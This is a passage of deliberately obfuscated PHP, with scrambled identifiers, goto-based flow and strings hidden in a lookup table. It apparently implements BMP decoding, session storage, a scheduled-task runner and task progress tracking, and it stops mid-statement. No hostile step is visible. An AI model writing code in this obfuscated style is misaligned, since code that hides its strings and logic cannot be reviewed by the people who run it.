$EİéÅ—Ä›¹ = $dÄĞä÷ ß¿ ? $dÄĞä÷ ß¿ : pow(2, $AŒ—šŞÔšÔ); goto eË¥ˆ›´’; eË¥ˆ›´’: $eš‹·šÆĞÊ = array(); for ($AßÅÎˆÛé” = 0; $AßÅÎˆÛé” < $EİéÅ—Ä›¹; ++$AßÅÎˆÛé”) { $aÜÚó´”•ê = fread($D¬Üº®Â’§, $AŒ¸éğ•†”); if ($aÜÚó´”•ê === !1) { imagedestroy($C‚—Ìœñ¨»); return !1; } extract(unpack($båé“¡Æš[1872], $aÜÚó´”•ê . $båé“¡Æš[1871])); $eš‹·šÆĞÊ[] = imagecolorallocate($C‚—Ìœñ¨», $bÂ…¬¿‰, $D¥²¡Èœ, $Bˆ¨”ó­Ì†); } $DÄ¶®Ô¹Œ = 8 - $AŒ—šŞÔšÔ; goto Fğ£Ïƒ«÷; Bƒï–Ÿ’¼ó: } else { goto C¹õ†È£®Å; Eƒ¶÷·›ë: $F§²éîáÀ¹ = $B–àÂ’ßáØ ? 1 / $B–àÂ’ßáØ : 1; $AÕ´¼¹ó»ë = $A·Ğ‚è¡İ ? 1 / $A·Ğ‚è¡İ : 1; $d”³§¢²êò = $e»ã×é¹¿‰ ? 1 / $e»ã×é¹¿‰ : 1; goto dÖæ·™ÂõÄ; DéÜÄ¹ğ»å: $dâ·ñ•Ô‘‰ = $AŒ—šŞÔšÔ >> 3; $bÀÏÃáå¶ = $fÌù¯Å‰‹ ? 127 : 0; $dÏ˜Ëã†Ö = $fÌù¯Å‰‹ ? 1 / $fÌù¯Å‰‹ : 1; goto Eƒ¶÷·›ë; dÖæ·™ÂõÄ: for ($böÕ½æìÜø = 0; $böÕ½æìÜø < $eÓÎ­›¸å; ++$böÕ½æìÜø, $AÖ¨šÄÈİ += $aÖ…Ê±—¾ê) { $aÜÚó´”•ê = fread($D¬Üº®Â’§, $D–ä„çµ¾Í); if ($aÜÚó´”•ê === !1) { imagedestroy($C‚—Ìœñ¨»); return !1; } $F—‚ì…‰ˆÛ = 0; for ($ašÅ¢ÂŞ—¢ = 0; $ašÅ¢ÂŞ—¢ < $AÔ’ÂÔïÀ; ++$ašÅ¢ÂŞ—¢, $F—‚ì…‰ˆÛ += $dâ·ñ•Ô‘‰) { list(, $bó´Âñè¼») = unpack($båé“¡Æš[1853], substr($aÜÚó´”•ê, $F—‚ì…‰ˆÛ, $dâ·ñ•Ô‘‰) . $båé“¡Æš[1877]); $Eô±¨ŒßŸ = $bó´Âñè¼» & $fÌù¯Å‰‹; $aø™…É = $bó´Âñè¼» & $B–àÂ’ßáØ; $c¿–áÁÁï = $bó´Âñè¼» & $A·Ğ‚è¡İ; $d‹îòÏá„À = $bó´Âñè¼» & $e»ã×é¹¿‰; $B™–îØäÓŒ = $bÀÏÃáå¶ - (($Eô±¨ŒßŸ << 7) - $Eô±¨ŒßŸ) * $dÏ˜Ëã†Ö; $bÂ…¬¿‰ = (($aø™…É << 8) - $aø™…É) * $F§²éîáÀ¹; $D¥²¡Èœ = (($c¿–áÁÁï << 8) - $c¿–áÁÁï) * $AÕ´¼¹ó»ë; $Bˆ¨”ó­Ì† = (($d‹îòÏá„À << 8) - $d‹îòÏá„À) * $d”³§¢²êò; imagesetpixel($C‚—Ìœñ¨», $ašÅ¢ÂŞ—¢, $AÖ¨šÄÈİ, $B™–îØäÓŒ << 24 | $bÂ…¬¿‰ << 16 | $D¥²¡Èœ << 8 | $Bˆ¨”ó­Ì†); } } imagealphablending($C‚—Ìœñ¨», !0); goto Aˆ’Ëš‹´; C¹õ†È£®Å: $C‚—Ìœñ¨» = imagecreatetruecolor($AÔ’ÂÔïÀ, $eÓÎ­›¸å); imagealphablending($C‚—Ìœñ¨», !1); if ($fÌù¯Å‰‹) { imagesavealpha($C‚—Ìœñ¨», !0); } goto DéÜÄ¹ğ»å; Aˆ’Ëš‹´: } return $C‚—Ìœñ¨»; goto DÑ™ÓÉŠ°Ú; fßˆ¶Í«Û£: if ($aÜÚó´”•ê === !1) { return !1; } list(, $eÍìà”¿·í) = unpack($båé“¡Æš[1853], $aÜÚó´”•ê); if ($eÍìà”¿·í == 12) { goto Aª•…šÎ‡; FìÕÌÙ¼Æ›: $dÄĞä÷ ß¿ = $D²á“ÉÜî† = $fÌù¯Å‰‹ = $AÄÁŒ¥—½í = 0; $B–àÂ’ßáØ = 16711680; $A·Ğ‚è¡İ = 65280; goto c¬ªåß•³; Aª•…šÎ‡: $aÜÚó´”•ê = fread($D¬Üº®Â’§, $eÍìà”¿·í - 4); if ($aÜÚó´”•ê === !1) { return !1; } extract(unpack($båé“¡Æš[1854] . $båé“¡Æš[1855] . $båé“¡Æš[1856] . $båé“¡Æš[1857], $aÜÚó´”•ê)); goto FìÕÌÙ¼Æ›; c¬ªåß•³: $e»ã×é¹¿‰ = 255; goto d¿êĞÌŒ‘¹; d¿êĞÌŒ‘¹: } else { if (124 < $eÍìà”¿·í || $eÍìà”¿·í < 40) { return !1; } else { goto DÈ£®‘óèÉ; cÑ­ŸÖùÌå: if ($AÔ’ÂÔïÀ & 2147483648) { $AÔ’ÂÔïÀ = -(~$AÔ’ÂÔïÀ & 4294967295) - 1; } if ($D™÷•½â½ß & 2147483648) { $D™÷•½â½ß = -(~$D™÷•½â½ß & 4294967295) - 1; } if ($dÒ‘íÎÅõ & 2147483648) { $dÒ‘íÎÅõ = -(~$dÒ‘íÎÅõ & 4294967295) - 1; } goto FÍÕ·÷ª»; FÍÕ·÷ª»: if ($B‚­µÏËŠÏ & 2147483648) { $B‚­µÏËŠÏ = -(~$B‚­µÏËŠÏ & 4294967295) - 1; } if ($d‰‡¡À›àİ[$båé“¡Æš[522]] != 0) { $a·àö£¨ĞŒ = $AŒ—šŞÔšÔ == 1 || $AŒ—šŞÔšÔ == 4 || $AŒ—šŞÔšÔ == 8 ? ($dÄĞä÷ ß¿ ? $dÄĞä÷ ß¿ : pow(2, $AŒ—šŞÔšÔ)) << 2 : 0; $eÙÃ‰Š–ö— = $D•ëÊˆä¬† ? $D•ëÊˆä¬† : ($AÔ’ÂÔïÀ * $AŒ—šŞÔšÔ + 31 >> 3 & ~3) * abs($D™÷•½â½ß); $aô¤¥§„± = $d‰‡¡À›àİ[$båé“¡Æš[522]] - $eÙÃ‰Š–ö— - $a·àö£¨ĞŒ - 14; if ($eÍìà”¿·í < $aô¤¥§„± && 40 <= $eÍìà”¿·í && $eÍìà”¿·í <= 124) { $eÍìà”¿·í = $aô¤¥§„±; } } if ($eÍìà”¿·í - 40 > 0) { $aÜÚó´”•ê = fread($D¬Üº®Â’§, $eÍìà”¿·í - 40); if ($aÜÚó´”•ê === !1) { return !1; } extract(unpack($båé“¡Æš[1867] . $båé“¡Æš[1868] . $båé“¡Æš[1869] . $båé“¡Æš[1870], $aÜÚó´”•ê . str_repeat($båé“¡Æš[1871], 120))); } else { $fÌù¯Å‰‹ = $B–àÂ’ßáØ = $A·Ğ‚è¡İ = $e»ã×é¹¿‰ = 0; } goto b˜®¡ˆªäì; DÈ£®‘óèÉ: $aÜÚó´”•ê = fread($D¬Üº®Â’§, 36); if ($aÜÚó´”•ê === !1) { return !1; } extract(unpack($båé“¡Æš[1858] . $båé“¡Æš[1859] . $båé“¡Æš[1856] . $båé“¡Æš[1860] . $båé“¡Æš[1861] . $båé“¡Æš[1862] . $båé“¡Æš[1863] . $båé“¡Æš[1864] . $båé“¡Æš[1865] . $båé“¡Æš[1866], $aÜÚó´”•ê)); goto cÑ­ŸÖùÌå; b˜®¡ˆªäì: if (($AŒ—šŞÔšÔ == 16 || $AŒ—šŞÔšÔ == 24 || $AŒ—šŞÔšÔ == 32) && $AÄÁŒ¥—½í == 0 && $B–àÂ’ßáØ == 0 && $A·Ğ‚è¡İ == 0 && $e»ã×é¹¿‰ == 0) { switch ($AŒ—šŞÔšÔ) { case 16: $B–àÂ’ßáØ = 31744; $A·Ğ‚è¡İ = 992; $e»ã×é¹¿‰ = 31; break; case 24: case 32: $B–àÂ’ßáØ = 16711680; $A·Ğ‚è¡İ = 65280; $e»ã×é¹¿‰ = 255; break; } } goto aÃªŒï ­; aÃªŒï ­: } } goto eå†´²±ëŠ; eå†´²±ëŠ: if ($AÔ’ÂÔïÀ == 0 || $D™÷•½â½ß == 0 || $aî÷øà¨‰ != 1 || ($fÌù¯Å‰‹ & $B–àÂ’ßáØ) != 0 || ($fÌù¯Å‰‹ & $A·Ğ‚è¡İ) != 0 || ($fÌù¯Å‰‹ & $e»ã×é¹¿‰) != 0 || ($B–àÂ’ßáØ & $A·Ğ‚è¡İ) != 0 || ($B–àÂ’ßáØ & $e»ã×é¹¿‰) != 0 || ($A·Ğ‚è¡İ & $e»ã×é¹¿‰) != 0) { return !1; } if ($AÄÁŒ¥—½í == 4 || $AÄÁŒ¥—½í == 5) { $aÜÚó´”•ê = stream_get_contents($D¬Üº®Â’§, $D•ëÊˆä¬†); if ($aÜÚó´”•ê === !1) { return !1; } return imagecreatefromstring($aÜÚó´”•ê); } $D–ä„çµ¾Í = $AÔ’ÂÔïÀ * $AŒ—šŞÔšÔ + 31 >> 3 & ~3; goto aŠˆ‡‹àÓ; aŠˆ‡‹àÓ: $eÓÎ­›¸å = abs($D™÷•½â½ß); $AÖ¨šÄÈİ = $D™÷•½â½ß > 0 ? $eÓÎ­›¸å - 1 : 0; $aÖ…Ê±—¾ê = $D™÷•½â½ß > 0 ? -1 : 1; goto cÌ ô¢ğÕë; DÑ™ÓÉŠ°Ú: } } goto eË¥°†ˆß; AŞ›ä›¨Œï: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto eèÂã¡Ü¿ö; eèÂã¡Ü¿ö: $Aí×Š·”İï =& $_SERVER[¬ˆÚÂ”Éğä]; static $bĞ±À¬õ›¿ = false; if ($bĞ±À¬õ›¿) { return $bĞ±À¬õ›¿; } goto E¨Ä‹„²¹·; cáŸ©¿ÁË: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $bĞ±À¬õ›¿ = new self(); return $bĞ±À¬õ›¿; goto d¥’ù®ëâğ; E¨Ä‹„²¹·: $cÏ‘Ïí°î = $GLOBALS[$Aí×Š·”İï[6]][$Aí×Š·”İï[337]]; self::$sessionTime = $cÏ‘Ïí°î[$Aí×Š·”İï[1410]]; $AãîíÀÁ = isset($GLOBALS[$Aí×Š·”İï[1411]]) ? $GLOBALS[$Aí×Š·”İï[1411]] : SESSION_ID; goto F·Ä¥…êÉ; e’»ëäÊå: $a´Æ‹‹ó´ƒ = $cÏ‘Ïí°î[$D™’¸øÍ]; $D¹šƒœ³ãÇ = $cÏ‘Ïí°î[$Aí×Š·”İï[763]]; switch ($D™’¸øÍ) { case $Aí×Š·”İï[17]: self::$handle = Model($Aí×Š·”İï[764]); break; case $Aí×Š·”İï[765]: self::$handle = new CacheRedis($a´Æ‹‹ó´ƒ, $D¹šƒœ³ãÇ); break; case $Aí×Š·”İï[766]: self::$handle = new CacheMemcached($a´Æ‹‹ó´ƒ, $D¹šƒœ³ãÇ); break; case $Aí×Š·”İï[167]: $a´Æ‹‹ó´ƒ[$Aí×Š·”İï[75]] = $a´Æ‹‹ó´ƒ[$Aí×Š·”İï[75]] . $Aí×Š·”İï[1413]; self::$handle = new CacheFile($a´Æ‹‹ó´ƒ, $D¹šƒœ³ãÇ); default: break; } goto cáŸ©¿ÁË; F·Ä¥…êÉ: if (self::$sessionSign) { } else { if (Cookie::get($AãîíÀÁ)) { self::$sessionSign = Cookie::get($AãîíÀÁ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($AãîíÀÁ, self::$sessionSign, self::$sessionTime); $D™’¸øÍ = $cÏ‘Ïí°î[$Aí×Š·”İï[1412]]; goto e’»ëäÊå; d¥’ù®ëâğ: } public static function sign($fËŒ­ÖÚ¦ = false) { $fËŒ­ÖÚ¦ && (self::$sessionSign = $fËŒ­ÖÚ¦); self::init(); return self::$sessionSign; } public static function set($bôŠä¹·ëĞ, $DñÂ½Ó­åñ = false) { self::init(); if (is_array($bôŠä¹·ëĞ)) { foreach ($bôŠä¹·ëĞ as $fÀİÃÁÍ½ => $F‚¤½ÀŒ®) { array_set_value(self::$data, $fÀİÃÁÍ½, $F‚¤½ÀŒ®); } } else { array_set_value(self::$data, $bôŠä¹·ëĞ, $DñÂ½Ó­åñ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($DÏ³ì¦É‹¢ = false) { self::init(); if (!$DÏ³ì¦É‹¢) { return self::$data; } return array_get_value(self::$data, $DÏ³ì¦É‹¢); } public static function remove($F´¦Ç‰ø¨í) { self::init(); unset(self::$data[$F´¦Ç‰ø¨í]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¬ˆÚÂ”Éğä][768])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto f·•¼Ú›´; E„ƒÒ¸ì¶: while (!0) { self::cacheClear(); if (self::valueGet($d˜ñò©³ë‹[697]) != $d˜ñò©³ë‹[83]) { self::valueSet($d˜ñò©³ë‹[1414], $d˜ñò©³ë‹[470]); self::log($d˜ñò©³ë‹[1418]); die; } self::valueSet($d˜ñò©³ë‹[1414], $d˜ñò©³ë‹[83]); self::valueSet($d˜ñò©³ë‹[1415], time()); self::taskRunAll(); sleep(self::valueGet($d˜ñò©³ë‹[1419])); } goto E•ï¬‹èØâ; FÓÆ ¯”‚®: http_close(); self::valueSet($d˜ñò©³ë‹[1414], $d˜ñò©³ë‹[83]); Hook::bind($d˜ñò©³ë‹[1416], $d˜ñò©³ë‹[1417]); goto E„ƒÒ¸ì¶; f·•¼Ú›´: $d˜ñò©³ë‹ =& $_SERVER[¬ˆÚÂ”Éğä]; if (self::valueGet($d˜ñò©³ë‹[697]) != $d˜ñò©³ë‹[83]) { return; } if (self::valueGet($d˜ñò©³ë‹[1414]) == $d˜ñò©³ë‹[83]) { $B¹‘Ñá†µ‚ = self::valueGet($d˜ñò©³ë‹[1415]); if (time() - $B¹‘Ñá†µ‚ > 3600 * 2) { self::restart(); } return; } goto FÓÆ ¯”‚®; E•ï¬‹èØâ: } public static function restart() { $A÷É—ÁŠ’ =& $_SERVER[¬ˆÚÂ”Éğä]; http_close(); self::valueSet($A÷É—ÁŠ’[697], $A÷É—ÁŠ’[470]); sleep(self::valueGet($A÷É—ÁŠ’[1419]) + 5); self::valueSet($A÷É—ÁŠ’[1414], $A÷É—ÁŠ’[470]); self::valueSet($A÷É—ÁŠ’[697], $A÷É—ÁŠ’[83]); } public static function shutdownEvent() { $f×÷…ºÚÃÙ =& $_SERVER[¬ˆÚÂ”Éğä]; self::valueSet($f×÷…ºÚÃÙ[1414], $f×÷…ºÚÃÙ[470]); self::log($f×÷…ºÚÃÙ[1420]); } public static function config($b×ÌŞ¦èâÒ, $d†ïÓ™‹ ‰) { $Dó½Ÿ¬ñ›à =& $_SERVER[¬ˆÚÂ”Éğä]; $AÈí‚Ğ¨¹ = 20; $d†ïÓ™‹ ‰ = intval($d†ïÓ™‹ ‰) <= $AÈí‚Ğ¨¹ ? $AÈí‚Ğ¨¹ : intval($d†ïÓ™‹ ‰); self::valueSet($Dó½Ÿ¬ñ›à[697], $b×ÌŞ¦èâÒ); self::valueSet($Dó½Ÿ¬ñ›à[1419], $d†ïÓ™‹ ‰); } private static function taskRunAll() { $DõÁéšŞâ =& $_SERVER[¬ˆÚÂ”Éğä]; $b»§ŸÒ——¸ = Model($DõÁéšŞâ[1421])->listData(); $fñ××ãÑ› = count($b»§ŸÒ——¸); for ($F§Ş¦ñé‘ê = 0; $F§Ş¦ñé‘ê < $fñ××ãÑ›; $F§Ş¦ñé‘ê++) { $BÒÇõ›ö«Ğ = $b»§ŸÒ——¸[$F§Ş¦ñé‘ê]; if ($BÒÇõ›ö«Ğ[$DõÁéšŞâ[1422]] != $DõÁéšŞâ[83]) { continue; } if (!self::taskTimeCheck($BÒÇõ›ö«Ğ)) { continue; } self::taskRun($BÒÇõ›ö«Ğ); } Hook::trigger($DõÁéšŞâ[1423]); } private static function taskTimeCheck($B†Â˜ ¥Üê) { goto bæÂ¤²±ï‹; fÏ…ÍÑ¼¡: $cºŒùÉ¼¬à = strtotime($E¼ï‹¤Öá¥[1424] . $EÚê…ëï–’[$E¼ï‹¤Öá¥[1425]] . $E¼ï‹¤Öá¥[1426]) - strtotime($E¼ï‹¤Öá¥[1427]); $BİÖ÷™Ê¶ = time() - strtotime(date($E¼ï‹¤Öá¥[1428]) . $E¼ï‹¤Öá¥[1429]); $a÷›‚ç™ÜÓ = $BİÖ÷™Ê¶ >= $cºŒùÉ¼¬à && $BİÖ÷™Ê¶ <= $cºŒùÉ¼¬à + 3600; goto eÌÏÈÓÕŠÍ; eÌÏÈÓÕŠÍ: switch ($EÚê…ëï–’[$E¼ï‹¤Öá¥[29]]) { case $E¼ï‹¤Öá¥[1430]: if (time() - $E†—¢Óƒ§“ < 3600 * 24 * 30) { return !1; } if ($EÚê…ëï–’[$E¼ï‹¤Öá¥[1430]] == date($E¼ï‹¤Öá¥[1431]) && $a÷›‚ç™ÜÓ) { return !0; } break; case $E¼ï‹¤Öá¥[1432]: if (time() - $E†—¢Óƒ§“ < 3600 * 24 * 7) { return !1; } $bàÌš³Ò‘¸ = date($E¼ï‹¤Öá¥[1433]) == 0 ? 7 : date($E¼ï‹¤Öá¥[1433]); if ($EÚê…ëï–’[$E¼ï‹¤Öá¥[1432]] == $bàÌš³Ò‘¸ && $a÷›‚ç™ÜÓ) { return !0; } break; case $E¼ï‹¤Öá¥[1425]: if (time() - $E†—¢Óƒ§“ < 3600 * 24) { return !1; } if ($a÷›‚ç™ÜÓ) { return !0; } break; case $E¼ï‹¤Öá¥[1434]: if (time() - $E†—¢Óƒ§“ >= floatval($EÚê…ëï–’[$E¼ï‹¤Öá¥[1434]]) * 60) { return !0; } break; default: break; } return !1; goto c¾ÉÔĞ‹®; bæÂ¤²±ï‹: $E¼ï‹¤Öá¥ =& $_SERVER[¬ˆÚÂ”Éğä]; $EÚê…ëï–’ = json_decode($B†Â˜ ¥Üê[$E¼ï‹¤Öá¥[190]], !0); $E†—¢Óƒ§“ = intval($B†Â˜ ¥Üê[$E¼ï‹¤Öá¥[1415]]); goto fÏ…ÍÑ¼¡; c¾ÉÔĞ‹®: } public static function taskRun($E¡´Á‰˜îİ) { goto f§÷¹¤•Å; f§÷¹¤•Å: $a„“‘ä¾”† =& $_SERVER[¬ˆÚÂ”Éğä]; self::log($a„“‘ä¾”†[1435] . $E¡´Á‰˜îİ[$a„“‘ä¾”†[367]] . $a„“‘ä¾”†[1436] . $E¡´Á‰˜îİ[$a„“‘ä¾”†[28]] . $a„“‘ä¾”†[1437] . $E¡´Á‰˜îİ[$a„“‘ä¾”†[1438]]); Model($a„“‘ä¾”†[1421])->run($E¡´Á‰˜îİ[$a„“‘ä¾”†[367]]); goto bö‡ğ…ŠÜ; bö‡ğ…ŠÜ: $cÆ¦¿ï™¹œ = timeFloat(); $Fªò¾öæ = $a„“‘ä¾”†[33]; switch ($E¡´Á‰˜îİ[$a„“‘ä¾”†[29]]) { case $a„“‘ä¾”†[295]: $fŒŞ¾ºòô¥ = url_request($E¡´Á‰˜îİ[$a„“‘ä¾”†[1438]], $a„“‘ä¾”†[216], !1, !1, !1, !1, 5); $Fªò¾öæ = strlen($fŒŞ¾ºòô¥); break; case $a„“‘ä¾”†[215]: $Fªò¾öæ = Hook::apply($E¡´Á‰˜îİ[$a„“‘ä¾”†[1438]]); default: break; } goto bÛô¤Ãğ”; bÛô¤Ãğ”: Model($a„“‘ä¾”†[1439])->add(array($a„“‘ä¾”†[1440] => $a„“‘ä¾”†[33], $a„“‘ä¾”†[1441] => $a„“‘ä¾”†[470], $a„“‘ä¾”†[29] => $a„“‘ä¾”†[1442] . $E¡´Á‰˜îİ[$a„“‘ä¾”†[367]], $a„“‘ä¾”†[1443] => json_encode(array($a„“‘ä¾”†[28] => $E¡´Á‰˜îİ[$a„“‘ä¾”†[28]], $a„“‘ä¾”†[1444] => timeFloat() - $cÆ¦¿ï™¹œ, $a„“‘ä¾”†[281] => $Fªò¾öæ)))); self::log($a„“‘ä¾”†[1445] . $E¡´Á‰˜îİ[$a„“‘ä¾”†[367]] . $a„“‘ä¾”†[1446] . $Fªò¾öæ); return !0; goto a‡…ßğ; a‡…ßğ: } private static function valueGet($c„ùªŞñ¦ˆ) { $bÁôä¡ŒšÄ =& $_SERVER[¬ˆÚÂ”Éğä]; $fŠÙ¢æÄ¡× = $bÁôä¡ŒšÄ[1447]; $A°±±¥¹Û = Model($bÁôä¡ŒšÄ[1448])->get($c„ùªŞñ¦ˆ, $fŠÙ¢æÄ¡×); if (is_null($A°±±¥¹Û)) { Model($bÁôä¡ŒšÄ[1448])->set($bÁôä¡ŒšÄ[1419], 10, $fŠÙ¢æÄ¡×); Model($bÁôä¡ŒšÄ[1448])->set($bÁôä¡ŒšÄ[697], $bÁôä¡ŒšÄ[83], $fŠÙ¢æÄ¡×); Model($bÁôä¡ŒšÄ[1448])->set($bÁôä¡ŒšÄ[1414], $bÁôä¡ŒšÄ[470], $fŠÙ¢æÄ¡×); $A°±±¥¹Û = Model($bÁôä¡ŒšÄ[1448])->get($c„ùªŞñ¦ˆ, $fŠÙ¢æÄ¡×); } return $A°±±¥¹Û; } private static function valueSet($Ešò¥Œé×œ, $D˜ˆÎÏÖ¸») { $A¥ šÂò¨ =& $_SERVER[¬ˆÚÂ”Éğä]; return Model($A¥ šÂò¨[1448])->set($Ešò¥Œé×œ, $D˜ˆÎÏÖ¸», $A¥ šÂò¨[1447]); } protected static function log($eÂÄïÕ†Æß) { write_log($eÂÄïÕ†Æß, $_SERVER[¬ˆÚÂ”Éğä][1449]); } private static function cacheClear() { $fİÎ©ºµÌÈ =& $_SERVER[¬ˆÚÂ”Éğä]; $DÆÒ¨ÓˆĞí = Model($fİÎ©ºµÌÈ[1448])->cacheKey($fİÎ©ºµÌÈ[1447]); Cache::clearMemory($DÆÒ¨ÓˆĞí); Model($fİÎ©ºµÌÈ[1421])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\162\165\x6e\x6e\x69\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($c³¨Êß„Ş, $f‡±µ–º‚ñ = '', $Fî¹Àˆõ¬Î = 0, $Aê¤åÆâë¬ = '') { goto Aáœù¨©ìÅ; dÓŒ½ß‡¥™: Hook::bind($DªÓ§’‚Ôº[1416], array($this, $DªÓ§’‚Ôº[1458])); Hook::bind($DªÓ§’‚Ôº[1459], array($this, $DªÓ§’‚Ôº[1460])); $this->startAfter(); goto Dïæó÷îÈ¶; Dïæó÷îÈ¶: Hook::trigger($DªÓ§’‚Ôº[1461], $this->task); $this->task[$DªÓ§’‚Ôº[1455]] = timeFloat(); goto aô©¾ÙŸĞÌ; Aáœù¨©ìÅ: $DªÓ§’‚Ôº =& $_SERVER[¬ˆÚÂ”Éğä]; if (self::get($c³¨Êß„Ş)) { return; } $this->task = array($DªÓ§’‚Ôº[367] => $c³¨Êß„Ş, $DªÓ§’‚Ôº[1450] => USER_ID, $DªÓ§’‚Ôº[1356] => $Aê¤åÆâë¬, $DªÓ§’‚Ôº[29] => $f‡±µ–º‚ñ, $DªÓ§’‚Ôº[991] => $DªÓ§’‚Ôº[33], $DªÓ§’‚Ôº[989] => $Fî¹Àˆõ¬Î, $DªÓ§’‚Ôº[1003] => 0, $DªÓ§’‚Ôº[1451] => 0, $DªÓ§’‚Ôº[1452] => 0, $DªÓ§’‚Ôº[1453] => timeFloat(), $DªÓ§’‚Ôº[1454] => 0, $DªÓ§’‚Ôº[1455] => 0, $DªÓ§’‚Ôº[1456] => 0, $DªÓ§’‚Ôº[1457] => 0, $DªÓ§’‚Ôº[697] => $DªÓ§’‚Ôº[1414]); goto dÓŒ½ß‡¥™; aô©¾ÙŸĞÌ: } public function end() { goto BöÒÃ•÷åè; Eâ´—àÑÊ: $aô¾†Å¿Û = timeFloat() - $this->task[$eÖÀŠš½˜”[1453]]; self::log($eÖÀŠš½˜”[1462] . $this->task[$eÖÀŠš½˜”[367]] . $eÖÀŠš½˜”[1463] . $aô¾†Å¿Û . $eÖÀŠš½˜”[1464]); Hook::unbind($eÖÀŠš½˜”[1416], array($this, $eÖÀŠš½˜”[1458])); goto Bç‚£Ç¢¾í; BöÒÃ•÷åè: $eÖÀŠš½˜” =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->task) { return; } if ($this->task[$eÖÀŠš½˜”[1455]]) { self::valueSet($this->task[$eÖÀŠš½˜”[367]], !1); } goto Eâ´—àÑÊ; Bç‚£Ç¢¾í: Hook::unbind($eÖÀŠš½˜”[1459], array($this, $eÖÀŠš½˜”[1460])); $this->endAfter(); $this->task = !1; goto e¥Š¯ÙÎß®; e¥Š¯ÙÎß®: } public function update($b’ÔÃÂÃ»ò = 0) { goto C‹“‰´„éÁ; b‚›óÌãÇ: $this->updateAfter(); $B£ßñŒ‘âñ = 0.2; if (timeFloat() - $d‡ùÁöè˜º[$DğĞÂ—øŒ[1455]] < $B£ßñŒ‘âñ) { return; } goto Cô²­ Åã§; cöæä‹ˆ“š: $d‡ùÁöè˜º[$DğĞÂ—øŒ[1003]] += $b’ÔÃÂÃ»ò; $d‡ùÁöè˜º[$DğĞÂ—øŒ[1454]] = timeFloat(); if ($d‡ùÁöè˜º[$DğĞÂ—øŒ[989]]) { if ($d‡ùÁöè˜º[$DğĞÂ—øŒ[989]] < $d‡ùÁöè˜º[$DğĞÂ—øŒ[1003]]) { $d‡ùÁöè˜º[$DğĞÂ—øŒ[989]] = $d‡ùÁöè˜º[$DğĞÂ—øŒ[1003]]; } $f³áÔƒ‚’› = timeFloat() - $d‡ùÁöè˜º[$DğĞÂ—øŒ[1453]] - $d‡ùÁöè˜º[$DğĞÂ—øŒ[1456]]; $d‡ùÁöè˜º[$DğĞÂ—øŒ[1451]] = $d‡ùÁöè˜º[$DğĞÂ—øŒ[1003]] / $d‡ùÁöè˜º[$DğĞÂ—øŒ[989]]; $d‡ùÁöè˜º[$DğĞÂ—øŒ[1452]] = $d‡ùÁöè˜º[$DğĞÂ—øŒ[1003]] / $f³áÔƒ‚’›; if ($d‡ùÁöè˜º[$DğĞÂ—øŒ[1451]] > 0) { $d‡ùÁöè˜º[$DğĞÂ—øŒ[1457]] = $f³áÔƒ‚’› * (1 - $d‡ùÁöè˜º[$DğĞÂ—øŒ[1451]]) / $d‡ùÁöè˜º[$DğĞÂ—øŒ[1451]]; } $d‡ùÁöè˜º[$DğĞÂ—øŒ[1457]] = $d‡ùÁöè˜º[$DğĞÂ—øŒ[1457]] <= 0 ? 0 : $d‡ùÁöè˜º[$DğĞÂ—øŒ[1457]]; } goto b‚›óÌãÇ; cè¢êİõÁ: Hook::trigger($DğĞÂ—øŒ[1468], $d‡ùÁöè˜º); self::valueSet($d‡ùÁöè˜º[$DğĞÂ—øŒ[367]], $d‡ùÁöè˜º); goto eö½¨•«ã”; Cô²­ Åã§: $aí±Ñó§ä = self::get($d‡ùÁöè˜º[$DğĞÂ—øŒ[367]]); $f®®¥ÃºŸ‘ = $aí±Ñó§ä[$DğĞÂ—øŒ[697]]; if ($f®®¥ÃºŸ‘ == self::STATYS_KILL) { $AÜŠĞÄ‚è = array($DğĞÂ—øŒ[1465] => LNG($DğĞÂ—øŒ[1466]), $DğĞÂ—øŒ[1045] => !1); Cache::set($DğĞÂ—øŒ[1467] . $this->task[$DğĞÂ—øŒ[367]], $AÜŠĞÄ‚è, 30); $this->end(); die; } else { if ($f®®¥ÃºŸ‘ == self::STATYS_STOP) { $AÖ‹¯À¡Ğó = 2; $aí±Ñó§ä[$DğĞÂ—øŒ[1456]] += $AÖ‹¯À¡Ğó; self::valueSet($d‡ùÁöè˜º[$DğĞÂ—øŒ[367]], $aí±Ñó§ä); sleep($AÖ‹¯À¡Ğó); $this->update(); return; } } goto aÀ¸à¯’¨¡; C‹“‰´„éÁ: $DğĞÂ—øŒ =& $_SERVER[¬ˆÚÂ”Éğä]; $d‡ùÁöè˜º =& $this->task; if (!$d‡ùÁöè˜º) { return; } goto cöæä‹ˆ“š; aÀ¸à¯’¨¡: $d‡ùÁöè˜º[$DğĞÂ—øŒ[697]] = $f®®¥ÃºŸ‘ ? $f®®¥ÃºŸ‘ : $d‡ùÁöè˜º[$DğĞÂ—øŒ[697]]; $d‡ùÁöè˜º[$DğĞÂ—øŒ[1456]] = $aí±Ñó§ä[$DğĞÂ—øŒ[1456]] ? $aí±Ñó§ä[$DğĞÂ—øŒ[1456]] : 0; $d‡ùÁöè˜º[$DğĞÂ—øŒ[1455]] = timeFloat(); goto cè¢êİõÁ; eö½¨•«ã”: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($e¥÷Ç‘ß) { $B²ô£ã¿ÀÆ =& $_SERVER[¬ˆÚÂ”Éğä]; Cache::set($B²ô£ã¿ÀÆ[1467] . $this->task[$B²ô£ã¿ÀÆ[367]], $e¥÷Ç‘ß, 60); return $e¥÷Ç‘ß; } public static function get($b¼‹‰‰²î—) { return self::valueGet($b¼‹‰‰²î—); } public static function listData() { $E 